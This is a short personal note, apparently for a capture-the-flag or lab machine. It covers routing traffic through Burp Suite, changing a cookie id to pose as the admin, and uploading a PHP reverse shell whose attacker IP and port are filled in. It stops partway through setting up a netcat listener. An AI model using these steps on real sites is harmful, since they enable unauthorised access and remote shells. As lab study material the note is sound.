# Principal
proxy per interceptar tràfic web (Fer explicació)

https://www.youtube.com/watch?v=YmZLdJRBKv0&t=3953s&ab_channel=S4viOnLive 43:07 sudo

Mirar info sobre cookies

Maybe file inclusion? For later?

# Process
1. Common enumeration.
2. Use Burp Suite to find new directories.
3. Manipulate cookies to be admin and upload files.
4. Dirbust the site to find where are the uploads located.
5. Upload reverse shell 


# Burpsuite
1. Configure Firefox to send traffic trought the proxy.
2. Settings > Search "Proxy" > Settings.
3. Change to Manual proxy. Enter Loopback @IP and port 8080
4. Disable interception in Burp as it's 
5. Proxy > Intercept > Intercept in on (Disable)

# Cookies 
Found that admin was id=34322 so change the Guest id to simulate he's the admin.
![[Pasted image 20220530192240.png]]

# Reverse Shell
Located in `/usr/share/webshells/php/php-reverse-shell.php`
Change port and ip. Upload the file. Dirbust the site again to find `.php`.
```bash
$ip = '10.10.15.56';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Set up a netcat listener in 